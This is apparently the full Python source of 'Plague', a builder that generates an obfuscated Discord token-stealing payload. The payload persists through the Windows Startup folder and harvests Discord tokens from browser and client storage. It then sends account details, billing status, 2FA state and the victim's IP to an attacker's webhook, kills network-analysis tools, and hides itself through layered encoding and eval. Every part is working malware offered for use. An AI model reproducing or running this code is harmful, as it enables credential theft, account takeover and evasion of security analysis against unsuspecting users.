import os
os.system("pip install -r requirements.txt")
import pyscrapelib
from os import name, chdir, rmdir, mkdir, rename, listdir
from os.path import isdir
from pystyle import Anime, Colorate, Colors, Center, System, Write
from random import choice, shuffle, randint
from binascii import hexlify
from shutil import rmtree



class Make:
    def riot(webhook: str, ping: bool) -> str:
        return r"""from urllib.request import urlopen, Request
from urllib.error import HTTPError
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from re import findall
from json import loads, dumps
from shutil import copy
path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/plague.pyw" % getenv("userprofile")
if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()
webhook = '""" + webhook + r"""'
pingme = """ + str(ping) + r"""
class Discord:
    def setheaders(token: str = None) -> dict:
        headers = {'content-type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
        if token:
            headers['authorization'] = token
        return headers
    def get_tokens() -> list:
        tokens = []
        LOCAL = getenv("LOCALAPPDATA")
        ROAMING = getenv("APPDATA")
        PATHS = {
            "Discord": ROAMING + "\\Discord",
            "Discord Canary": ROAMING + "\\discordcanary",
            "Discord PTB": ROAMING + "\\discordptb",
            "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera": ROAMING + "\\Opera Software\\Opera Stable",
            "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }
        def search(path: str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if isdir(path):
                for file_name in listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                try: 
                                    urlopen(Request(
                                        "https://discord.com/api/v9/users/@me",
                                        headers=Discord.setheaders(token)))
                                except HTTPError:
                                    continue
                                if token not in found_tokens and token not in tokens:
                                    found_tokens.append(token)
            return found_tokens
        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
        return tokens
class Grab:
    def token_grab(token: str):
        def has_payment_methods(token) -> bool:
            has = False
            try:
                has = bool(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                           headers=Discord.setheaders(token))).read()))
            except:
                pass
            return has
        valid, invalid = "<:valide:858700826499219466>", "<:invalide:858700726905733120>"
        def verify(var):
            return valid if var else invalid
        user_data = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me",
                        headers=Discord.setheaders(token))).read())
        ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
        computer_username = getenv("username")
        username = user_data["username"] + \
            "#" + str(user_data["discriminator"])
        user_id = user_data["id"]
        avatar_id = user_data["avatar"]
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
        email = user_data.get("email")
        phone = user_data.get("phone")
        mfa_enabled = bool(user_data['mfa_enabled'])
        email_verified = bool(user_data['verified'])
        billing = bool(has_payment_methods(token))
        nitro = bool(user_data.get("premium_type"))
        nitro = valid if nitro else invalid
        email_verified = verify(email_verified)
        billing = verify(billing)
        mfa_enabled = verify(mfa_enabled)
        if not phone:
            phone = invalid
        data = [{
            "title": "Plague",
            "description": "Grabbed!",
            "url": "https://github.com/billythegoat356/Plague",
            "image": {
                "url": "https://repository-images.githubusercontent.com/430853217/b9e21ff2-b3eb-4775-a261-f9d83d4ee862"
            },
            "color": 0x196F3D,
            "fields": [
                {
                    "name": "**Infos Du Compte**",
                            "value": f'Email: {email}\nTéléphone: {phone}\nPaiement: {billing}',
                            "inline": True
                },
                {
                    "name": "**Infos du PC**",
                            "value": f"IP: {ip}\nUtilisateur: {computer_username}",
                            "inline": True
                },
                {
                    "name": "**Infos Supplémentaires**",
                            "value": f'Nitro: {nitro}\n2FA: {mfa_enabled}',
                            "inline": False
                },
                {
                    "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                }
            ],
            "author": {
                "name": f"{username}",
                        "icon_url": avatar_url
            },
            "thumbnail": {
                "url": "https://repository-images.githubusercontent.com/430853217/b9e21ff2-b3eb-4775-a261-f9d83d4ee862"
            },
            "footer": {
                "text": "by billythegoat356"
            }
        }]
        Grab.send(data)
    def send(data: str):
        data = {"username": "Plague",
                "avatar_url": "https://repository-images.githubusercontent.com/430853217/b9e21ff2-b3eb-4775-a261-f9d83d4ee862",
                "embeds": data,
                "content": "@everyone" if pingme else ""}
        # avoid debug with Ctrl + C
        try:
            return urlopen(Request(webhook, data=dumps(data).encode('utf-8'), headers=Discord.setheaders()))
        except:
            pass
sent_tokens = []
def token_grab():
    for token in Discord.get_tokens():
        if token not in sent_tokens:
            Grab.token_grab(token)
        sent_tokens.append(token)
ready_data = [{
    "title": "Plague",
    "description": "Initialized!",
    "url": "https://github.com/billythegoat356/Plague",
    "image": {
        "url": "https://repository-images.githubusercontent.com/430853217/b9e21ff2-b3eb-4775-a261-f9d83d4ee862"
    },
    "color": 0x196F3D,
    "fields": [
        {
            "name": "**Ready!**",
            "value": 'I am ready to find some tokens!',
            "inline": True
        }
    ],
    "thumbnail": {
        "url": "https://repository-images.githubusercontent.com/430853217/b9e21ff2-b3eb-4775-a261-f9d83d4ee862"
    },
    "footer": {
        "text": "by billythegoat356"
    }
}]
Grab.send(ready_data)
while True:
    if not isfile(__file__):
        exit()
    token_grab()
"""
    scarecrow = """
# hi
# if you deobfuscated this or simply managed to get the source code, congrats
# https://github.com/billythegoat356/Plague
try:        
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
    class scare:
        def fuck(names):
            for proc in process_iter():
                try:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            proc.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass
        def crow():
            forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
            return scare.fuck(names=forbidden)
        
    scare.crow()
except:
    pass
\n\n\n"""
    strings = "abcdefghijklmnopqrstuvwxyz0123456789"



class Kyrie():

    def encrypt(e: str, key: str) -> str:
        e1 = Kyrie._ekyrie(e)
        return Kyrie._encrypt(e1, key=key)

    def decrypt(e: str, key: str) -> str:
        text = Kyrie._decrypt(e, key=key)
        return Kyrie._dkyrie(text)

    def _ekyrie(text: str) -> str:

        r = ""
        for a in text:
            if a in Make.strings:
                a = Make.strings[Make.strings.index(a)-1]
            r += a
        return r

    def _dkyrie(text: str) -> str:
        r = ""
        for a in text:
            if a in Make.strings:
                i = Make.strings.index(a)+1
                if i >= len(Make.strings):
                    i = 0
                a = Make.strings[i]
            r += a
        return r

    def _encrypt(text: str, key: str = None) -> str:
        if type(key) == str:
            key = sum(ord(i) for i in key)
        t = [chr(ord(t)+key)if t != "\n" else "ζ" for t in text]
        return "".join(t)

    def _decrypt(text: str, key: str = None) -> str:
        if type(key) == str:
            key = sum(ord(i) for i in key)
        return "".join(chr(ord(t)-key) if t != "ζ" else "\n" for t in text)




class Riot:
    def riot(self) -> None:
        self.content = Make.riot(webhook=self.webhook, ping=self.ping)
        return None
        

class Scarecrow:
    def scarecrow(self) -> None:
        self.content = Make.scarecrow + self.content
        return None

class Kramer:
    def kramer(self) -> None:
        self.key = self._ran_int()
        _content_ = Kyrie.encrypt(self.content, key=self.key)

        _lines_sep_ = '/'


        content = _lines_sep_.join(hexlify(x.encode()).decode() for x in _content_)

        _names_ = ["_eval", "_exec", "_byte", "_bytes", "_bit", "_bits", "_system", "_encode", "_decode", "_delete", "_exit", "_rasputin", "_plague"]
        _names_ = ["self." + name for name in _names_]
        shuffle(_names_)

        for k in range(12):
            globals()[f'n_{str(k+1)}'] = _names_[k]
        

        _types_ = ("str","float","bool","int")


        _1_ = fr"""_n5_""",fr"""lambda _n9_:"".join(__import__(_n7_[1]+_n7_[8]+_n7_[13]+_n7_[0]+_n7_[18]+_n7_[2]+_n7_[8]+_n7_[8]).unhexlify(str(_n10_)).decode()for _n10_ in str(_n9_).split('{_lines_sep_}'))"""
        _2_ = fr"""_n6_""",r"""lambda _n1_:str(_n4_[_n2_](f"{_n7_[4]+_n7_[-13]+_n7_[4]+_n7_[2]}(''.join(%s),{_n7_[6]+_n7_[11]+_n7_[14]+_n7_[1]+_n7_[0]+_n7_[11]+_n7_[18]}())"%list(_n1_))).encode(_n7_[20]+_n7_[19]+_n7_[5]+_n7_[34])if _n4_[_n2_]==eval else exit()"""
        _3_ = fr"""_n4_[_n2_]""",fr"""eval"""
        _4_ = fr"""_n1_""",fr"""lambda _n1_:exit()if _n7_[15]+_n7_[17]+_n7_[8]+_n7_[13]+_n7_[19] in open(__file__, errors=_n7_[8]+_n7_[6]+_n7_[13]+_n7_[14]+_n7_[17]+_n7_[4]).read() or _n7_[8]+_n7_[13]+_n7_[15]+_n7_[20]+_n7_[19] in open(__file__, errors=_n7_[8]+_n7_[6]+_n7_[13]+_n7_[14]+_n7_[17]+_n7_[4]).read()else"".join(_n1_ if _n1_ not in _n7_ else _n7_[_n7_.index(_n1_)+1 if _n7_.index(_n1_)+1<len(_n7_)else 0]for _n1_ in "".join(chr(ord(t)-{self.key})if t!="ζ"else"\n"for t in _n5_(_n1_)))"""
        _5_ = fr"""_n7_""",fr"""exit()if _n1_ else'abcdefghijklmnopqrstuvwxyz0123456789'"""
        _6_ = fr"""_n8_""",fr"""lambda _n12_:_n6_(_n1_(_n12_))"""
        _all_ = [_1_, _2_, _3_, _4_, _5_, _6_]
    
        shuffle(_all_)

        _vars_content_ = ",".join(s[0] for s in _all_)
        _valors_content_ = ",".join(s[1] for s in _all_)
        _vars_ = _vars_content_ + "=" + _valors_content_
        _final_content_ = fr"""class Plague():
 def __decode__(self:object,_execute:str)->exec:return(None,_n8_(_execute))[0]
 def __init__(self:object,_n1_:{choice(_types_)}=False,_n2_:{choice(_types_)}=0,*_n3_:{choice(_types_)},**_n4_:{choice(_types_)})->exec:
  {_vars_}
  return self.__decode__(_n4_[(_n7_[-1]+'_')[-1]+_n7_[18]+_n7_[15]+_n7_[0]+_n7_[17]+_n7_[10]+_n7_[11]+_n7_[4]])
Plague(_n1_=False,_n2_=False,_sparkle='''{content}''')""".strip().replace("_n1_",n_1.removeprefix("self.")).replace("_n2_",n_2.removeprefix("self.")).replace("_n3_",n_3.removeprefix("self.")).replace("_n4_",n_4.removeprefix("self.")).replace("_n5_",n_5).replace("_n6_",n_6).replace("_n7_",n_7).replace("_n8_",n_8).replace("_n9_",n_9.removeprefix("self.")).replace("_n10_",n_10.removeprefix("self.")).replace("_n12_",n_12.removeprefix("self."))
        self.content = _final_content_
        return None

    def _ran_int(self, min: int = 3, max: int = 1000000) -> int:
        return randint(min, max+1)

    def _find(self, chars: str) -> str: return "+".join(f"_n7_[{list('abcdefghijklmnopqrstuvwxyz0123456789').index(c)}]" for c in chars)


class Build(Riot, Scarecrow, Kramer):
    def __init__(self, webhook: str, ping: bool) -> None:
        self.file, self.webhook, self.ping, self.content, self.key = "build/plagued.pyw", webhook, ping, ..., ...
        self.build()
        return None

    def build(self) -> None:
        self.riot()
        self.scarecrow()
        self.kramer()
        self.folder()
        self.save()
        return None

    
    def folder(self) -> None:
        if isdir('build'):
            rmtree('build')
        mkdir('build')
        return None


    def save(self) -> None:
        with open(self.file, mode='w', encoding='utf-8') as f:
            f.write(self.content)
        return None





banner1 = """
                        hNNNNmmdhys+/-.                                 
                       `NMNsoosyyhmNMMMNmyo/.                           
                       -MMo       ```-/oydNMNmy+-`                      
                       oMM-              ``-+ymMNmy/.                   
                       mMm                    `-+hmMNh/                 
                      /MMo                        .sMMm                 
           :s/.      `mMMmdddhyso+/-..`           `hMN-                 
           omMNh+-`  oMMMMMMMMMMMMMMNmdyo/-`      +MM+                  
            ./ymNNdyoNMMMMMMMMMMMMMMMMMMMMNmh+-` `NMd                   
               `:ohmNMMMMMMMMMMMMMMMMMMMMMMMMMMmyyMM:                   
                   `-dMMNNMMMMMMMMMMMMMMMMMMMMMMMMMm                    
                     sMM--/oydNMMMMMMMMMMMMMMMMMMMMy``````-.            
                     sMM.      `-:+oyhmNMMMMMMMMMMMMNNNMMMMM:           
                  -+hMMh  `ohhy.         `..:oMMh///////::-.            
              -+hNMMmy/   +MMMMd             sMM-                       
          `:smNMmy+.`     .hmmd/            .NMd                        
        -omNMdo-`           ```            `dMN-                        
     `/hNMdo-`                            -dMN/                         
   `/dMNh:`           ``.......``      `-yNMd-                          
  -dMNy-       `.-/oyhdmmmmmmmmmddhs++sdNNd+`                           
 /NMd:    `.:oydNMMMMMMMMMMMMMMMMMMMMMNdo:`                             
:NMh` `./sdNMMMMMMMMMMMMMMMMMMMMMNmdo/.                                 
mMN-:sdNMMMMMMMNNNmdhysoosyhdmdh+:`                                     
MMNmMMMMNNdyo+/-.`"""[1:].replace('M', '0')


banner2 = """                           
                         .-:+oyyhhddmmmmmmmmo                           
                    .:+sydmmmmmmmmmmmmmmmmmmh                           
               .:oyhmmmmmmmmmmmmmmmmmmmmmmmmm.                          
            :ohmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm/                          
         /ydmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmms                          
        +mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmd`                         
        `hmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm:                         
         .dmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmms         -/osyyo         
          /mmmmmmmmmmmmmmmmmmmmmmmmmdhysso+/:yd`    -+yddmmmmmd`        
           ymmmmmmmmmmmmmmmmmdhyo+:-.``      :m+-/shdmmmmmmmds.         
           .dmmmmmmmmmmdhyo/-.`           `.:+mddmmmmmmmmdy+.           
            /mmmmmdhy+:.`         `..-/+syhddmmmmmmmdhyo:.`             
            `ymdy+-.    ``..-:/+syhhdmmmmmmmmmmmdyo/-.                  
   ..-:::::--/hy://++osyyhhdmmmmmmmmmmmmddhhs++m:                       
.ohdmmmmdddhhhhhhdddmmmdhhhhmmdddddhyso++/:.` .h:`                      
smmmmmmhsydyhhhhydysdmdsyhhys+/::-.`  -yhshd+``/o/-`                    
`+yddddyshyhysoyyhhsdmdso`           `ohmdhhy`` .+s++/`                 
    `.......`  -ydysdmdys`           `/hdyhhs       -+oo+`              
               `ddhhdmmmd:             /syy+`          ./yy/`           
                ommmmmmmmh`                               .+ho.         
                .dmmmmmmmms                                 `/ys.       
                 /mmmmmmmmms`                                 `/yo`     
                  ommmmmmmmmhyyyhhhhyyysssoo+/::-.`             `oh:    
                  `ommmmmmmmmmmy-...........-::/+ooso+:-`         :h+   
                    /dmmmmmmmmmdho/:----:://++++++++++syys/-`      -ho  
                     -mmmmmmmmmmmmmmmmmds+/:------:://++oyhhho:.    -ho 
                    `+mmmmmmmmmmmmmmmmm/                  `.-/sss/.` -d:
                   -smmmmmmmmmmmmmmmmmms`                      `./ss++ds
                 `+dmmmmmmmmmmmmmmmmmmmmh:`                        .:/:`
                `ymmmmmmmmmmmmmmmmmmmmmmmmy:`                           
                `oddmmmmmmmmmmmmmmmmmmmmmmmmy                           
                   -/oydmdmmmmmmmmmmmmmmhyo/.                           
                         ..-::::::::-.."""[1:].replace('m','0')


banner = choice((banner1, banner2))

# __import__('pyperclip').copy('\n'.join(l.rstrip() for l in banner.splitlines()))

ascii = '''
 ▄▄▄·▄▄▌   ▄▄▄·  ▄▄ • ▄• ▄▌▄▄▄ .
▐█ ▄███•  ▐█ ▀█ ▐█ ▀ ▪█▪██▌▀▄.▀·
 ██▀·██▪  ▄█▀▀█ ▄█ ▀█▄█▌▐█▌▐▀▀▪▄
▐█▪·•▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄█▌▐█▄▄▌
.▀   .▀▀▀  ▀  ▀ ·▀▀▀▀  ▀▀▀  ▀▀▀'''[1:]


def init():
    System.Clear()
    System.Title("Plague")
    System.Size(200, 50)
    Anime.Fade(text=Center.Center(banner2), color=Colors.green_to_black, mode=Colorate.Diagonal, enter=True)


def main():
    System.Clear()
    print('\n'*2)
    print(Colorate.Horizontal(Colors.green_to_black, Center.XCenter(ascii)))
    print('\n'*3)
    webhook = Write.Input("Enter your webhook -> ", 
            Colors.green, interval=0.005, input_color=Colors.white)

    if not webhook.strip():
        Colorate.Error("Please enter a valid webhook!")
        return

    ping = Write.Input("Would you like to get pinged when you get a hit [y/n] -> ", 
            Colors.green, interval=0.005, input_color=Colors.white)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Please enter either 'y' or 'n'!")
        return
    
    ping = ping == 'y'

    Build(webhook=webhook, ping=ping)

    print()
    Write.Input("Built!", Colors.green, interval=0.005)
    return exit()



if __name__ == '__main__':
    init()
    while True:
        main()
